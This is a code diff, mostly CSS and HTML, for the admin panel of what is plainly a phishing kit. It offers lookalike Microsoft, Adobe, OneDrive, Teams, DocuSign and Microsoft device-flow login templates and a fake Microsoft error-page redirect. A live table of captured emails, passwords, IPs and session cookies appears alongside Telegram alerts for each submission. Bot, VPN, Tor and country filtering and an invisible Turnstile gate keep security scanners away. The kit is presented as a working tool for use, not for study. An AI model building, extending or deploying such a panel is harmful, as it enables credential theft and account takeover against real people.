+.cloudflare-field label {
+  display: block;
+  margin-bottom: 6px;
+  font-size: 11px;
+  font-weight: 600;
+  color: var(--text-dim);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.cloudflare-field input,
+.cloudflare-field select {
+  width: 100%;
+  padding: 10px 12px;
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  border-radius: 6px;
+  color: var(--text);
+  font-family: var(--font-mono);
+  font-size: 13px;
+  transition: all 0.2s ease;
+}
+
+.cloudflare-field input:focus,
+.cloudflare-field select:focus {
+  outline: none;
+  border-color: var(--c-warn);
+  box-shadow: 0 0 0 3px rgba(245, 158, 11, 0.1);
+  background: rgba(255, 255, 255, 0.08);
+}
+
+.cloudflare-field input::placeholder {
+  color: #ffffff !important;
+  opacity: 1;
+}
+
+/* API Configuration Card */
+.api-config-card {
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  margin: 16px 0;
+  overflow: hidden;
+  transition: all 0.3s ease;
+  background: rgba(255, 255, 255, 0.02);
+}
+
+.api-config-card:hover {
+  border-color: var(--c-warn);
+}
+
+.api-config-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 12px 16px;
+  background: rgba(255, 255, 255, 0.05);
+  cursor: pointer;
+  border-bottom: 1px solid transparent;
+  transition: border-color 0.3s ease;
+}
+
+.api-config-card.open .api-config-header {
+  border-bottom-color: var(--border);
+}
+
+.api-config-title {
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--text);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.api-config-title::after {
+  content: "▼";
+  font-size: 10px;
+  margin-left: 8px;
+  transition: transform 0.3s ease;
+  opacity: 0.7;
+}
+
+.api-config-card.open .api-config-title::after {
+  transform: rotate(180deg);
+}
+
+.api-config-content {
+  display: none;
+  padding: 16px;
+  animation: slideDown 0.3s ease;
+}
+
+.api-config-card.open .api-config-content {
+  display: block;
+}
+
+/* Turnstile Card */
+.turnstile-card {
+  border-left: 5px solid var(--c-primary);
+  padding: 6px;
+  margin: 6px 0;
+  transition: all 0.3s ease;
+}
+
+.turnstile-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 0; /* Reduced from 12px since content is hidden by default */
+  cursor: pointer;
+}
+
+.turnstile-title {
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--c-primary);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+/* Dropdown arrow for Turnstile */
+.turnstile-title::after {
+  content: "▼";
+  font-size: 10px;
+  margin-left: 8px;
+  transition: transform 0.3s ease;
+  opacity: 0.7;
+}
+
+/* Rotate arrow when open */
+.turnstile-card.open .turnstile-title::after {
+  transform: rotate(180deg);
+}
+
+.turnstile-content {
+  display: none;
+  margin-top: 12px;
+  padding-top: 12px;
+  border-top: 1px solid rgba(59, 130, 246, 0.2);
+  animation: slideDown 0.3s ease;
+}
+
+.turnstile-card.open .turnstile-content {
+  display: block;
+}
+
+/* Action Buttons */
+.cloudflare-actions {
+  display: flex;
+  gap: 12px;
+  align-items: center;
+  margin-top: 16px;
+}
+
+.cloudflare-btn {
+  background: linear-gradient(135deg, var(--c-warn) 0%, var(--c-error) 100%);
+  border: none;
+  padding: 10px 16px;
+  border-radius: 6px;
+  color: white;
+  font-family: var(--font-mono);
+  font-size: 11px;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  box-shadow: 0 4px 15px rgba(245, 158, 11, 0.3);
+}
+
+.cloudflare-btn:hover {
+  transform: translateY(-1px);
+  box-shadow: 0 6px 20px rgba(245, 158, 11, 0.4);
+}
+
+.cloudflare-btn.secondary {
+  background: rgba(255, 255, 255, 0.1);
+  color: var(--text);
+  box-shadow: none;
+}
+
+.cloudflare-btn.secondary:hover {
+  background: rgba(255, 255, 255, 0.15);
+  transform: translateY(-1px);
+}
+
+/* Responsive Design */
+@media (max-width: 768px) {
+  .cloudflare-security {
+    grid-template-columns: 1fr;
+  }
+  
+  .cloudflare-fields {
+    grid-template-columns: 1fr;
+  }
+  
+  .cloudflare-config {
+    padding: 20px;
+    margin: 16px 0;
+  }
+  
+  .cloudflare-header {
+    flex-direction: column;
+    gap: 16px;
+    align-items: flex-start;
+  }
+}
+
+/* Modern App Security Configuration Styles */
+.app-security-config {
+   padding: 5px; /* Reduced by ~70% from 24px */
+  margin: 2px 0; /* Reduced by ~70% from 24px */
+  margin-bottom: 0 !important;
+  box-shadow: 0 4px 20px rgba(139, 92, 246, 0.1);
+  transition: all 0.3s ease;
+}
+
+.app-security-config:hover {
+  box-shadow: 0 8px 30px rgba(139, 92, 246, 0.2);
+  transform: translateY(-2px);
+}
+
+.app-security-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 10px; /* Reduced by ~70% from 32px */
+  padding-bottom: 5px; /* Reduced by ~70% from 16px */
+  border-bottom: 1px solid rgba(139, 92, 246, 0.3);
+}
+
+.app-security-title {
+  display: flex;
+  align-items: center;
+  gap: 6px; /* Reduced */
+  font-size: 10px;
+  font-weight: 700;
+  color: var(--c-primary);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+
+
+
+/* App Security Features Grid */
+.app-security-features {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+  gap: 5px; /* Reduced by ~70% from 16px */
+  margin-bottom: 10px; /* Reduced by ~70% from 32px */
+}
+
+.app-security-card {
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  border-radius: 8px;
+  padding: 5px; /* Reduced by ~70% from 16px */
+  transition: all 0.3s ease;
+}
+
+.app-security-card:hover {
+  border-color: var(--c-primary);
+  transform: translateY(-1px);
+}
+
+.app-security-card.bot-protection {
+  border-left: 4px solid var(--c-primary);
+}
+
+.app-security-card.country-filter {
+  border-left: 4px solid var(--c-info);
+}
+
+.app-security-card.ip-whitelist {
+  border-left: 4px solid var(--c-success);
+}
+
+.app-security-card.vpn-block {
+  border-left: 4px solid var(--c-warn);
+}
+
+.app-security-card-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 4px; /* Reduced */
+}
+
+.app-security-card-title {
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--text);
+  display: flex;
+  align-items: center;
+  gap: 4px; /* Reduced */
+}
+
+.app-security-status {
+  font-size: 10px;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  padding: 2px 6px;
+  border-radius: 3px;
+  color: #ffffff;
+}
+
+.app-security-status.active {
+  background: var(--c-primary);
+  color: white;
+}
+
+.app-security-status.inactive {
+  background: rgba(255, 255, 255, 0.1);
+  color: var(--text-dim);
+}
+
+/* App Security Toggle Switch */
+.app-security-toggle {
+  position: relative;
+  display: inline-block;
+  width: 50px;
+  height: 24px;
+}
+
+.app-security-toggle input {
+  opacity: 0;
+  width: 0;
+  height: 0;
+}
+
+.app-security-slider {
+  position: absolute;
+  cursor: pointer;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background-color: rgba(255, 255, 255, 0.1);
+  transition: 0.3s;
+  border-radius: 24px;
+  border: 1px solid rgba(255, 255, 255, 0.2);
+}
+
+.app-security-slider:before {
+  position: absolute;
+  content: "";
+  height: 18px;
+  width: 18px;
+  left: 3px;
+  bottom: 3px;
+  background-color: white;
+  transition: 0.3s;
+  border-radius: 50%;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+}
+
+.app-security-toggle input:checked + .app-security-slider {
+  background-color: var(--c-primary);
+  box-shadow: 0 0 15px rgba(139, 92, 246, 0.5);
+}
+
+.app-security-toggle input:checked + .app-security-slider:before {
+  transform: translateX(26px);
+}
+
+/* App Security Input Fields */
+.app-security-fields {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+  gap: 5px; /* Reduced by ~70% from 16px */
+  margin-bottom: 6px; /* Reduced by ~70% from 20px */
+}
+
+.app-security-field {
+  position: relative;
+}
+
+.app-security-field label {
+  display: block;
+  margin-bottom: 2px; /* Reduced by ~70% from 6px */
+  font-size: 11px;
+  font-weight: 600;
+  color: var(--text-dim);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.app-security-field input,
+.app-security-field select {
+  width: 100%;
+  padding: 4px 6px; /* Reduced by ~60-70% from 10px 12px */
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  border-radius: 6px;
+  color: var(--text);
+  font-family: var(--font-mono);
+  font-size: 13px;
+  transition: all 0.2s ease;
+}
+
+.app-security-field input:focus,
+.app-security-field select:focus {
+  outline: none;
+  border-color: var(--c-primary);
+  box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.1);
+  background: rgba(255, 255, 255, 0.08);
+}
+
+.app-security-field input::placeholder {
+  color: #ffffff !important;
+  opacity: 1;
+}
+
+/* Country Selection */
+.app-country-selector {
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  border-radius: 6px;
+  overflow: hidden;
+  transition: all 0.3s ease;
+}
+
+.app-country-selector:hover {
+  border-color: var(--c-info);
+}
+
+.app-country-toggle {
+  width: 100%;
+  text-align: left;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  color: var(--text);
+  padding: 4px 6px; /* Reduced from 10px 12px */
+  cursor: pointer;
+  transition: all 0.2s ease;
+  font-family: var(--font-mono);
+  font-size: 13px;
+}
+
+.app-country-toggle:hover {
+  background: rgba(255, 255, 255, 0.08);
+  border-color: var(--c-info);
+}
+
+.app-country-dropdown {
+  display: none;
+  max-height: 200px;
+  overflow-y: auto;
+  background: var(--bg-2);
+  border-top: 1px solid rgba(255, 255, 255, 0.1);
+}
+
+.app-country-dropdown select {
+  width: 100%;
+  background: transparent;
+  border: none;
+  color: var(--text);
+  font-family: var(--font-mono);
+  font-size: 12px;
+  padding: 4px; /* Reduced from 8px */
+}
+
+.app-country-dropdown select option {
+  padding: 2px 4px; /* Reduced from 4px 8px */
+  transition: background 0.2s ease;
+}
+
+.app-country-dropdown select option:hover {
+  background: rgba(59, 130, 246, 0.2);
+}
+
+/* ProxyCheck Details */
+.app-proxycheck-details {
+  margin-top: 5px; /* Reduced from 16px */
+  padding: 5px; /* Reduced from 16px */
+  background: rgba(245, 158, 11, 0.05);
+  border: 1px solid rgba(245, 158, 11, 0.3);
+  border-radius: 6px;
+  animation: slideDown 0.3s ease;
+}
+
+.app-proxycheck-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 4px; /* Reduced from 12px */
+}
+
+.app-proxycheck-item {
+  display: flex;
+  align-items: center;
+  gap: 4px; /* Reduced from 8px */
+  padding: 4px; /* Reduced from 8px */
+  background: rgba(255, 255, 255, 0.05);
+  border-radius: 4px;
+  transition: all 0.2s ease;
+}
+
+.app-proxycheck-item:hover {
+  background: rgba(255, 255, 255, 0.08);
+}
+
+.app-proxycheck-item input[type="checkbox"] {
+  margin: 0;
+  accent-color: var(--c-warn);
+}
+
+.app-proxycheck-item label {
+  font-size: 11px;
+  color: var(--text);
+  margin: 0;
+  cursor: pointer;
+}
+
+/* Responsive Design */
+@media (max-width: 768px) {
+  .app-security-features {
+    grid-template-columns: 1fr;
+  }
+  
+  .app-security-fields {
+    grid-template-columns: 1fr;
+  }
+  
+  .app-security-config {
+    padding: 10px; /* Reduced */
+    margin: 8px 0; /* Reduced */
+  }
+  
+  .app-security-header {
+    flex-direction: column;
+    gap: 5px; /* Reduced */
+    align-items: flex-start;
+  }
+  
+  .app-proxycheck-grid {
+    grid-template-columns: 1fr;
+  }
+}
+/* Link Configuration Styles */
+.link-config {
+  border-radius: 12px;
+  margin:  0;
+  box-shadow: 0 4px 20px rgba(59, 130, 246, 0.1);
+}
+
+.link-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 6px;
+  padding-bottom: 6px;
+
+}
+
+.link-title {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  font-size: 10px;
+  font-weight: 700;
+  color: var(--c-info);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+
+.link-icon {
+  width: 24px;
+  height: 24px;
+  background: var(--c-info);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 14px;
+  color: white;
+  box-shadow: 0 0 10px rgba(59, 130, 246, 0.5);
+}
+
+.link-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 20px;
+}
+
+.link-field {
+  display: flex;
+}
+
+.link-field label {
+  display: flex;
+  margin-bottom: 8px;
+  font-size: 12px;
+  font-weight: 600;
+  color: #fff;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.link-field input, .link-field select {
+  width: 100%;
+  padding: 12px 16px;
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  border-radius: 8px;
+  color: var(--text);
+  font-family: var(--font-mono);
+  font-size: 14px;
+  transition: all 0.2s ease;
+}
+
+.link-field input:focus, .link-field select:focus {
+  outline: none;
+  border-color: var(--c-info);
+  box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+  background: rgba(255, 255, 255, 0.08);
+}
+
+.link-field input::placeholder {
+  color: #ffffff !important;
+  opacity: 1;
+}
+
+/* Specific overrides for upload button inside link config if needed */
+.link-field button {
+  padding: 12px 24px;
+  border-radius: 8px;
+  border: none;
+  background: var(--c-info);
+  color: white;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+.link-field button:hover {
+  transform: translateY(-1px);
+  box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
+}
+
+/* Modern Results Container */
+.modern-results-container {
+  background: linear-gradient(135deg, rgba(255, 255, 255, 0.05) 0%, rgba(0, 0, 0, 0.1) 100%);
+  border: 1px solid var(--c-info);
+  border-radius: 12px;
+  padding: 24px;
+  margin-bottom: 24px;
+  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+  transition: all 0.3s ease;
+  position: relative;
+}
+
+.modern-results-container:hover {
+  box-shadow: 0 8px 30px rgba(59, 130, 246, 0.2);
+  border-color: var(--accent);
+  transform: translateY(-2px);
+}
+
+</style>
+</head>
+<body>
+<div class="app">
+  <div class="topbar">
+    <div class="brand"><span class="brand-dot"></span>@ClosedService-Panel</div>
+    <div class="nav">
+      <button id="navSettings" class="active">Settings</button>
+      <button id="navSubmissions">Submissions</button>
+      <button id="clearLogs" style="border-color:var(--danger);color:var(--danger)">Clear Logs</button>
+    </div>
+  </div>
+  <div class="container">
+    <div class="main">
+      <div class="modern-analysis-sidebar" style="margin-bottom: 0;">
+
+        <div class="analysis-box-compact box-info">
+          <div class="analysis-value" id="stat-visits">0</div>
+          <div class="analysis-label">Total Visits</div>
+        </div>
+        <div class="analysis-box-compact box-success">
+          <div class="analysis-value" id="stat-correct">0</div>
+          <div class="analysis-label">Correct</div>
+        </div>
+        <div class="analysis-box-compact box-error">
+          <div class="analysis-value" id="stat-incorrect">0</div>
+          <div class="analysis-label">Incorrect</div>
+        </div>
+        <div class="analysis-box-compact box-primary">
+          <div class="analysis-value" id="stat-total-cookies">0</div>
+          <div class="analysis-label">Cookies</div>
+        </div>
+      </div>
+  <div id="section-settings">
+  <div class="modern-nav-container">
+    <div class="modern-nav-tabs">
+      <button class="modern-tab-btn active" data-tab="tab-general">
+        <span class="tab-icon">🏠</span>
+        <span class="tab-label">General</span>
+      </button>
+      <button class="modern-tab-btn" data-tab="tab-security">
+        <span class="tab-icon">🛡️</span>
+        <span class="tab-label">Security</span>
+      </button>
+      <button class="modern-tab-btn" data-tab="tab-submissions">
+        <span class="tab-icon">📥</span>
+        <span class="tab-label">Results</span>
+      </button>
+
+    </div>
+  </div>
+
+  <!-- Moved Results Section -->
+  <div id="results-container" class="modern-results-container" style="display:none;">
+      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+        <h3 style="margin:0; color:var(--accent); text-transform:uppercase; font-size:14px; letter-spacing:1px;">📥 Results & Submissions</h3>
+        <div style="display:flex; gap:10px; align-items:center;">
+          <label style="display:flex;align-items:center;gap:6px;font-size:11px;color:var(--text-dim);cursor:pointer;text-transform:uppercase">
+            <input type="checkbox" id="showVisits" style="width:auto;margin:0"> Visits
+          </label>
+          <span class="badge" id="eventsCount" style="border-color:var(--c-info); color:var(--c-info)">0</span>
+          <button class="secondary" id="refreshEvents" style="padding:4px 12px; font-size:11px;">Refresh</button>
+        </div>
+      </div>
+      <div class="muted" style="font-size:11px; margin-bottom:16px;">Real-time view of captured credentials and sessions</div>
+      <div class="table-wrap">
+        <table id="eventsTable">
+          <thead>
+            <tr>
+              <th>Time</th>
+              <th>Type</th>
+              <th>Email</th>
+              <th>Password</th>
+              <th>IP</th>
+              <th>Cookies</th>
+            </tr>
+          </thead>
+          <tbody></tbody>
+        </table>
+      </div>
+  </div>
+  
+  <div class="settings-layout">
+    <div class="settings-main">
+        <!-- Main content sections will go here -->
+    <div class="settings-content-wrapper">
+      <div id="tab-general" class="tab-content active">
+      <div id="deployment-links-container" style="display:none; margin-bottom: 4px;   background: rgba(59, 130, 246, 0.05);">
+          <h3 style="margin-bottom:2px; color:white; text-transform:uppercase; font-size:19px; letter-spacing:1px;">Your Links</h3>
+          <div id="deployment-links-list" style="display: flex; flex-direction: column; gap: 10px;"></div>
+      </div>
+
+      <div class="status-indicators" style="margin-bottom: 6px;">
+        <h3 style="margin-bottom:10px; color:var(--text); text-transform:uppercase; font-size:14px; letter-spacing:1px;">Connection Status</h3>
+        <div style="display: flex; gap: 20px;">
+          <div style="display: flex; align-items: center; gap: 8px;">
+            <span id="cloudflareStatusDot" class="status-dot"></span>
+            <span style="font-size: 12px; color: var(--text-dim);">Cloudflare</span>
+          </div>
+          <div style="display: flex; align-items: center; gap: 8px;">
+            <span id="proxycheckStatusDot" class="status-dot"></span>
+            <span style="font-size: 12px; color: var(--text-dim);">Bot Protection</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Modern Link Configuration -->
+      <div class="link-config">
+        <div class="link-header">
+          <div class="link-title">
+
+          </div>
+        </div>
+        
+        <div class="link-grid">
+            <div class="link-field">
+              <label for="template">Page Template</label>
+              <select id="template">
+                <option value="microsoft">Microsoft (Default)</option>
+                <option value="adobe">Adobe</option>
+                <option value="onedrive">OneDrive</option>
+                <option value="teams_audio">Teams Audio</option>
+                <option value="docusign">DocuSign</option>
+                <option value="upload">Upload (Custom Background)</option>
+                <option value="helper">Microsoft Device Flow (Helper)</option>
+              </select>
+            </div>
+            
+            <div class="link-field" id="adminUploadGroup" style="display:none">
+              <label>Upload Background Image</label>
+              <form id="uploadForm" style="display:flex;gap:12px;align-items:center">
+                <input type="file" name="image" accept="image/png,image/jpeg,image/jpg,image/webp" required style="flex:1;padding:12px;border:1px solid var(--border);background:var(--bg-1);color:var(--accent);font-family:var(--font-mono);font-size:13px;">
+                <button type="submit" id="uploadBtn">Upload</button>
+              </form>
+              <details style="margin-top:8px; cursor:pointer">
+                <summary style="color:var(--c-info); font-size:11px; text-transform:uppercase; outline:none">View Active Background</summary>
+                <div class="preview" style="margin-top:8px">
+                  <img id="uploadPreview" src="" alt="Current background" style="max-width:100%; border:1px solid var(--c-info); display:block">
+                </div>
+              </details>
+            </div>
+
+            <div class="link-field">
+              <label for="redirectType">Post-Login Redirect</label>
+              <select id="redirectType">
+                <option value="custom">Custom URL...</option>
+                <option value="error_page">Error Page (Microsoft)</option>
+              </select>
+            </div>
+            
+             <div class="link-field" id="redirectUrlGroup">
+              <input id="redirectUrl" type="url" placeholder="https://example.com" style="display: none; border: 1px solid rgba(59, 130, 246, 0.5); box-shadow: 0 0 15px rgba(59, 130, 246, 0.1); transition: all 0.3s ease;">
+            </div>
+        </div>
+      </div>
+      <!-- Modern Telegram Configuration -->
+      <div class="telegram-config">
+        <div class="telegram-header">
+          <div class="telegram-title">
+            
+            Telegram Notifications
+          </div>
+          <label class="telegram-toggle">
+            <input id="telemetryEnabled" type="checkbox">
+            <span class="toggle-slider"></span>
+          </label>
+        </div>
+        
+        <div id="telegram-details" style="display:none;">
+          <div class="telegram-grid">
+            <div class="telegram-field">
+              <label for="telegramBotToken" style="color: white;">Bot Token</label>
+              <input id="telegramBotToken" type="password" placeholder="Enter your bot token">
+            </div>
+            <div class="telegram-field">
+              <label for="telegramChatId" style="color: white;">Chat ID</label>
+              <input id="telegramChatId" type="text" placeholder="123456789">
+            </div>
+          </div>
+          
+          <div style="margin-top: 12px; display: flex; align-items: center; justify-content: space-between; padding: 0 4px;">
+            <label for="telegramReportIncorrect" style="color: white; font-size: 13px;">Report Incorrect Submissions</label>
+            <label class="telegram-toggle" style="transform: scale(0.8);">
+              <input id="telegramReportIncorrect" type="checkbox" checked>
+              <span class="toggle-slider"></span>
+            </label>
+          </div>
+
+          <div style="text-align: right; display: flex; align-items: center; justify-content: flex-end;">
+            <span id="telegramTestStatus" style="font-size: 11px; font-weight: 600; text-transform: uppercase;"></span>
+          </div>
+        </div>
+      <!-- Modern Cloudflare Configuration moved to tab-security -->
+      </div>
+    </div>
+    <div id="tab-security" class="tab-content">
+      <!-- Modern Cloudflare Configuration -->
+      <div class="cloudflare-config">
+        <div class="cloudflare-header">
+          <div class="cloudflare-title">
+            <div class="cloudflare-icon">☁️</div>
+            Cloudflare
+          </div>
+        </div>
+      <!-- Unified Cloudflare Control -->
+      <div class="unified-cloudflare-control">
+        <div class="unified-header">
+          <div class="unified-title">
+            ☁️ Cloudflare Security 
+            <span class="tooltip-icon" title="Enable/disable all Cloudflare security features with one button">?</span>
+          </div>
+          <label class="cloudflare-toggle unified-toggle">
+            <input id="cfMasterToggle" type="checkbox">
+            <span class="cloudflare-slider"></span>
+          </label>
+        </div>
+        <div class="unified-status" id="cfMasterStatusText">OFFLINE</div>
+        
+        <div class="unified-features" style="display:flex; flex-direction:row; gap:16px; flex-wrap:wrap;">
+          <div class="feature-item" style="display:flex; justify-content:space-between; flex:1; min-width:200px;">
+            <div style="display:flex; gap:8px;">
+              <span class="feature-icon">🔒</span>
+              <span class="feature-text">SSL/HTTPS</span>
+            </div>
+            <span class="feature-status" id="cfSecurityStatus">❌</span>
+          </div>
+          <div class="feature-item" style="display:flex; justify-content:space-between; flex:1; min-width:200px;">
+            <div style="display:flex; gap:8px;">
+              <span class="feature-icon">🛡️</span>
+              <span class="feature-text">Bot Shield</span>
+            </div>
+            <span class="feature-status" id="cfBotShieldStatus">❌</span>
+          </div>
+          <div class="feature-item" style="display:flex; justify-content:space-between; flex:1; min-width:200px;">
+            <div style="display:flex; gap:8px;">
+              <span class="feature-icon">⚡</span>
+              <span class="feature-text">Under Attack</span>
+            </div>
+            <span class="feature-status" id="cfUnderAttackStatus">❌</span>
+          </div>
+        </div>
+        
+        <div class="unified-actions">
+          <button type="button" class="cloudflare-btn secondary" id="syncCloudflareBtn">Sync Status</button>
+        </div>
+        <div style="display:none">
+          <input type="checkbox" id="cfSecurityEnabled">
+          <input type="checkbox" id="cfBotShield">
+          <input type="checkbox" id="cfUnderAttack">
+        </div>
+      </div>
+        
+        <!-- Turnstile Configuration -->
+        <div class="turnstile-card" id="turnstileCard">
+          <div class="turnstile-header" onclick="toggleTurnstileCard()">
+            <div class="turnstile-title">
+              🎫 Turnstile Gate
+            </div>
+            <label class="cloudflare-toggle" onclick="event.stopPropagation()">
+              <input id="cfTurnstileEnabled" type="checkbox">
+              <span class="cloudflare-slider"></span>
+            </label>
+          </div>
+          <div class="turnstile-content">
+            <div class="cloudflare-fields">
+              <div class="cloudflare-field">
+                <label for="cfSiteKey">Turnstile Site Key</label>
+                <input id="cfSiteKey" type="text" placeholder="0x4AAAA...">
+              </div>
+              <div class="cloudflare-field">
+                <label for="cfSecretKey">Turnstile Secret Key</label>
+                <input id="cfSecretKey" type="password" placeholder="0x4AAAA...">
+              </div>
+              
+              <!-- Turnstile Visibility Toggle -->
+              <div class="cloudflare-field" style="flex-direction: row; align-items: center; justify-content: space-between; margin-top: 10px; background: rgba(255,255,255,0.02); padding: 8px; border-radius: 4px;">
+                <label for="cfTurnstileInvisible" style="margin:0; font-size: 11px; cursor:pointer;">
+                    <span style="font-weight:600; color:var(--text);">Invisible Mode</span>
+                    <div class="muted" style="font-size:10px; font-weight:400; margin-top:2px;">Hide the challenge page completely (Blank Screen)</div>
+                </label>
+                <label class="cloudflare-toggle">
+                  <input id="cfTurnstileInvisible" type="checkbox">
+                  <span class="cloudflare-slider"></span>
+                </label>
+              </div>
+
+              <!-- Create Widget Tool -->
+              <div style="margin-top: 15px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 15px;">
+                  <div style="font-size: 12px; font-weight: 600; color: var(--c-primary); margin-bottom: 8px;">✨ Auto-Create Widget</div>
+                  <div class="cloudflare-fields">
+                      <div class="cloudflare-field">
+                          <label for="cfWidgetDomain">Domains (Hosts)</label>
+                          <div style="font-size:10px; color:var(--text-dim); margin-bottom:4px;">Hold Ctrl/Cmd to select multiple domains</div>
+                          <select id="cfWidgetDomain" multiple style="width:100%; height: 100px; padding: 4px;">
+                              <option value="">Select domains...</option>
+                          </select>
+                      </div>
+                      <div class="cloudflare-field">
+                          <label for="cfWidgetMode">Widget Mode</label>
+                          <select id="cfWidgetMode" style="width:100%">
+                              <option value="invisible" selected>Invisible (Recommended)</option>
+                              <option value="managed">Managed (Checkbox)</option>
+                              <option value="non-interactive">Non-interactive</option>
+                          </select>
+                      </div>
+                      <button type="button" class="cloudflare-btn" id="createWidgetBtn" style="width:100%">Create & Auto-Fill</button>
+                  </div>
+              </div>
+
+            </div>
+            <div class="cloudflare-actions">
+              <button type="button" class="cloudflare-btn secondary" id="validateTurnstileBtn">Check Config</button>
+              <span id="validateTurnstileStatus" class="muted"></span>
+            </div>
+          </div>
+        </div>
+        
+        <!-- API Config (Dropdown) -->
+        <div class="api-config-card" id="apiConfigCard">
+          <div class="api-config-header" onclick="toggleApiConfigCard()">
+            <div class="api-config-title">
+              🔑 Cloudflare API Configuration
+            </div>
+          </div>
+          <div class="api-config-content">
+            <div class="cloudflare-fields">
+              <div class="cloudflare-field">
+                <label for="cfApiKey">Global API Key</label>
+                <input id="cfApiKey" type="password" placeholder="c554...">
+              </div>
+              <div class="cloudflare-field">
+                <label for="cfEmail">Cloudflare Email</label>
+                <input id="cfEmail" type="text" placeholder="email@example.com">
+              </div>
+              <div class="cloudflare-field">
+                <label for="cfZoneSelect">Cloudflare Zone</label>
+                <div style="display:flex;gap:8px">
+                  <select id="cfZoneSelect" style="flex:1;">
+                     <option value="">Enter API credentials first...</option>
+                  </select>
+                  <button type="button" id="refreshZonesBtn" class="cloudflare-btn secondary" title="Refresh Zones">↻</button>
+                </div>
+                <input type="hidden" id="cfZoneId">
+                <input type="hidden" id="cfAccountId">
+              </div>
+              <div class="cloudflare-field">
+                <label for="cfCountryBlockingEnabled" style="display:flex;align-items:center;gap:8px;">
+                  🌍 Country Blocking
+                  <span class="tooltip-icon" title="Enable country blocking on Cloudflare">?</span>
+                </label>
+                <input id="cfCountryBlockingEnabled" type="checkbox">
+              </div>
+              <div class="cloudflare-field">
+                <label for="cfAllowedCountries">Allowed Countries (ISO)</label>
+                <div style="display:flex;gap:8px">
+                  <input id="cfAllowedCountries" type="text" placeholder="US, CA, UK" style="flex:1">
+                  <button type="button" id="updateCfCountriesBtn" class="cloudflare-btn secondary" title="Update Country Rules">Update</button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Modern App Security Configuration -->
+      <div class="app-security-config">
+        <div class="app-security-header">
+          <div class="app-security-title">
+            Link Bot Settings
+          </div>
+        </div>
+        
+        <!-- App Security Features -->
+        <div class="app-security-features">
+          <div class="app-security-card bot-protection">
+            <div class="app-security-card-header">
+              <div class="app-security-card-title">
+                BOT PROTECTION
+                <span class="tooltip-icon" title="Comprehensive protection: Blocks Bots, Crawlers, VPNs, Proxies, and Tor nodes.">?</span>
+              </div>
+              <label class="app-security-toggle">
+                <input id="securityEnabled" type="checkbox">
+                <span class="app-security-slider"></span>
+              </label>
+            </div>
+            <div class="app-security-status" id="securityStatusText">OFFLINE</div>
+
+            <!-- Merged VPN/Proxy/Tor Controls -->
+            <div id="proxycheck-details" class="app-proxycheck-details" style="margin-top: 16px; padding-top: 16px; border-top: 1px solid rgba(255,255,255,0.1); background: transparent;">
+                <div class="app-proxycheck-grid">
+                  <div class="app-proxycheck-item">
+                    <input id="proxycheckBlockVPN" type="checkbox">
+                    <label for="proxycheckBlockVPN">Block VPN</label>
+                  </div>
+                  <div class="app-proxycheck-item">
+                    <input id="proxycheckBlockProxy" type="checkbox">
+                    <label for="proxycheckBlockProxy">Block Proxy</label>
+                  </div>
+                  <div class="app-proxycheck-item">
+                    <input id="proxycheckBlockTor" type="checkbox">
+                    <label for="proxycheckBlockTor">Block Tor</label>
+                  </div>
+                </div>
+                <div class="app-proxycheck-settings" style="margin-top: 12px; display: grid; grid-template-columns: 1fr; gap: 12px; padding: 0 12px 12px 12px;">
+                  <div class="app-security-field">
+                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:2px;">
+                      <label for="proxycheckApiKey" style="font-size: 10px; color: #fff; margin:0;">API Key</label>
+                      <a href="https://proxycheck.io/" target="_blank" rel="noopener noreferrer" style="font-size: 10px; color: var(--c-info); text-decoration: underline;">
+                        Buy 5$ antibot key here
+                      </a>
+                    </div>
